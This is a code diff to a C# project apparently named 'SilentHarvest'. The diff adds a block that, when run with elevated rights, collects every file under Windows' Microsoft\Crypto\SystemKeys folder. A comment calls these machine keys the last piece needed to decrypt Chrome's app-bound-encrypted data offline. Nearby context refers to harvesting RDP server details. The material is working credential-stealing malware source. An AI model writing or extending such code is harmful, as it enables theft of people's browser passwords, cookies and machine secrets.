@@ -569,6 +569,28 @@ namespace SilentHarvest
                 }
             }
 
+            // CNG machine key files (Chrome ABE Chromekey1/2 live here) --
+            // the last artifact needed for fully-offline v20 decryption
+            if (elevated)
+            {
+                try
+                {
+                    string skDir = Path.Combine(
+                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+                        @"Microsoft\Crypto\SystemKeys");
+                    if (Directory.Exists(skDir))
+                        foreach (string f in Directory.GetFiles(skDir))
+                        {
+                            byte[] data = Util.ReadFileLoose(f);
+                            if (data == null || data.Length > 1024 * 1024) continue;
+                            parts.Add(new Part("win:systemkeys/" + Path.GetFileName(f), data,
+                                new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
+                            n++;
+                        }
+                }
+                catch { }
+            }
+
             // RDP server hints (readable registry, no elevation needed)
             try
             {
